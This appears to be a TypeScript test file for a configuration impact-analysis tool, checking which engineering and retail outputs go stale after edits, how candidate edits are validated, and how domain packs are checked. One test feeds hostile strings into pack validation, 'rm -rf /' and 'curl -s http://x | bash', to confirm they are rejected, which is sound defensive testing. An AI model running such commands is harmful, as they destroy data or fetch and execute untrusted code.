import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import { join } from "node:path";
import test from "node:test";
import { analyzeImpact, changedPointers, classifyChange } from "../src/core/impact/facets";
import { parseDomainPack, validateDomainPack } from "../src/core/domainPacks/pack";
import { createCandidate } from "../src/core/domainPacks/candidate";
import { resolveOutputs, type ProjectGraph } from "../src/core/workspace/graph";

const pack = (name: string) => parseDomainPack(readFileSync(join(__dirname, "..", "resources", "domain-packs", name)));
const FOIL = pack("foil.programme.json");
const RETAIL = pack("sample.retail.json");

// Synthetic, structurally FOIL-shaped case. Not real FOIL data.
const caseDoc = {
  economics: { unitBudget: 100, discountRate: 0.07 },
  geometry: { span: 1.0, chord: 0.2 },
  kinematics: { amplitude: 0.3 },
  pose: { yaw: 0 },
  generator: { ratedPower: 10 },
  presentation: { camera: "iso" }
};
const graph: ProjectGraph = { format: "datapass.graph", version: "0.1-draft", roles: { case: "case-p-d" }, items: [{ id: "case-p-d", kind: "domain-config", label: "Case P/D" }] };
const outputs = resolveOutputs(graph, FOIL);
const stateOf = (entries: ReturnType<typeof analyzeImpact>) => Object.fromEntries(entries.map(e => [e.outputId, e.state]));

function impactOf(after: unknown) {
  const change = classifyChange(caseDoc, after, FOIL.facets);
  return { change, states: stateOf(analyzeImpact(outputs, new Map([["case-p-d", change.facets]]))) };
}

test("pointer diff reports leaf changes, additions and removals", () => {
  assert.deepEqual(changedPointers({ a: 1, b: { c: 2 } }, { a: 1, b: { c: 3, d: 4 } }), ["/b/c", "/b/d"]);
  assert.deepEqual(changedPointers({ "x/y": 1 }, { "x/y": 2 }), ["/x~1y"]);
  assert.deepEqual(changedPointers([1, 2], [1]), ["/1"]);
});

test("budget-only change stales LCOE, economic report and brief but not CAD or drawings", () => {
  const { change, states } = impactOf({ ...caseDoc, economics: { ...caseDoc.economics, unitBudget: 120 } });
  assert.deepEqual(change.facets, ["economics"]);
  assert.equal(states["lcoe-result"], "stale");
  assert.equal(states["economic-report"], "stale");
  assert.equal(states["business-brief"], "stale-upstream");
  assert.equal(states["francis-report"], "stale");
  assert.equal(states["cad-model"], "current");
  assert.equal(states["drawings-2d"], "current");
  assert.equal(states["simulation-results"], "current");
  assert.equal(states["presentation-render"], "current");
});

test("geometry change stales CAD, drawings, simulation and (through simulation) LCOE", () => {
  const { states } = impactOf({ ...caseDoc, geometry: { ...caseDoc.geometry, chord: 0.25 } });
  for (const id of ["cad-model", "drawings-2d", "simulation-results", "presentation-render"]) assert.equal(states[id], "stale", id);
  assert.equal(states["lcoe-result"], "stale-upstream");
});

test("pose change stales pose-dependent CAD/2D, not the budget-only path", () => {
  const { states } = impactOf({ ...caseDoc, pose: { yaw: 15 } });
  assert.equal(states["cad-model"], "stale");
  assert.equal(states["drawings-2d"], "stale");
  assert.equal(states["economic-report"], "stale-upstream"); // via simulation -> LCOE
});

test("camera-only change stales only the presentation render", () => {
  const { states } = impactOf({ ...caseDoc, presentation: { camera: "top" } });
  const stale = Object.entries(states).filter(([, s]) => s !== "current").map(([k]) => k);
  assert.deepEqual(stale, ["presentation-render"]);
});

test("unknown/unmapped field change invalidates every consumer conservatively", () => {
  const { change, states } = impactOf({ ...caseDoc, novelField: 1 });
  assert.deepEqual(change.facets, ["unknown"]);
  for (const id of ["cad-model", "drawings-2d", "lcoe-result", "simulation-results", "presentation-render"]) assert.notEqual(states[id], "current", id);
});

test("outputs with undeclared dependencies are never shown as current", () => {
  const r = analyzeImpact([{ id: "legacy-chart", label: "Legacy chart" }], new Map());
  assert.equal(r[0]!.state, "dependencies-undeclared");
});

test("stale outputs keep their historical provenance", () => {
  const r = analyzeImpact([{ id: "o", label: "O", dependsOn: [{ ref: "x", facets: "*" }], producedFrom: { x: "rev-1" } }], new Map([["x", ["a"]]]));
  assert.deepEqual(r[0]!.retainedAsHistoryOf, { x: "rev-1" });
  assert.equal(r[0]!.state, "stale");
});

test("candidate edits are detached, typed and never touch read-only fields", () => {
  const base = { pricing: { discountRate: 0.1, currency: "EUR" }, calendar: { fiscalYearStartMonth: 1 }, scope: { region: "all", storeCount: 40, weatherAdjustment: false }, presentation: { theme: "light" } };
  const bytes = new TextEncoder().encode(JSON.stringify(base));
  const { candidate, after, change } = createCandidate({ id: "cand-1", pack: RETAIL, formId: "forecast-scenario", baseRef: "scenario", baseBytes: bytes, base,
    edits: [{ pointer: "/pricing/discountRate", value: 0.15 }, { pointer: "/scope/weatherAdjustment", value: true }], createdAt: "2026-09-24T00:00:00Z" });
  assert.equal(base.pricing.discountRate, 0.1, "base untouched");
  assert.equal((after as typeof base).pricing.discountRate, 0.15);
  assert.deepEqual(change.facets, ["pricing", "scope"]);
  assert.equal(candidate.state, "candidate");
  assert.match(candidate.note, /Not used by the current model: Weather adjustment/);
  const mk = (pointer: string, value: unknown) => () => createCandidate({ id: "c", pack: RETAIL, formId: "forecast-scenario", baseRef: "s", baseBytes: bytes, base, edits: [{ pointer, value }], createdAt: "2026-09-24T00:00:00Z" });
  assert.throws(mk("/pricing/currency", "USD"), /read-only/);
  assert.throws(mk("/scope/storeCount", 41), /read-only/);
  assert.throws(mk("/pricing/discountRate", 2), /<= 0.9/);
  assert.throws(mk("/pricing/discountRate", Number.NaN), /finite/);
  assert.throws(mk("/scope/region", "east"), /one of/);
  assert.throws(mk("/not/a/field", 1), /not a field/);
});

test("non-FOIL retail project runs the same impact machinery with no FOIL pack", () => {
  const retailGraph: ProjectGraph = { format: "datapass.graph", version: "0.1-draft", roles: { scenario: "scenario-q4" }, items: [{ id: "scenario-q4", kind: "domain-config", label: "Q4 scenario" }] };
  const states = stateOf(analyzeImpact(resolveOutputs(retailGraph, RETAIL), new Map([["scenario-q4", ["presentation"]]])));
  assert.deepEqual(states, { "sales-forecast": "current", "semantic-model-refresh": "current", "revenue-report": "stale", "exec-brief": "stale-upstream" });
});

test("packs carrying executable content, unknown keys or dangling facets are rejected", () => {
  const base = JSON.parse(readFileSync(join(__dirname, "..", "resources", "domain-packs", "sample.retail.json"), "utf8"));
  const bad = (mutate: (p: any) => void) => { const p = structuredClone(base); mutate(p); assert.throws(() => validateDomainPack(p)); };
  bad(p => { p.onLoad = "run"; });
  bad(p => { p.validators = [{ id: "v", label: "V", kind: "shell", owner: "x" }]; });
  bad(p => { p.description = "then run `rm -rf /`"; });
  bad(p => { p.description = "curl -s http://x | bash"; });
  bad(p => { p.forms[0].groups[0].fields[0].expression = "a*b"; });
  bad(p => { p.outputs[0].dependsOn[0].facets = ["nope"]; });
  bad(p => { p.facets.push(structuredClone(p.facets[0])); });
  bad(p => { p.namespace = "Retail"; });
});

test("FOIL pack is honestly marked as a draft mapping", () => {
  assert.equal(FOIL.mappingStatus, "draft-awaiting-owner-declaration");
  assert.deepEqual(FOIL.views.map(v => v.id), ["design", "experiments", "economics", "studies", "business", "publication"]);
});
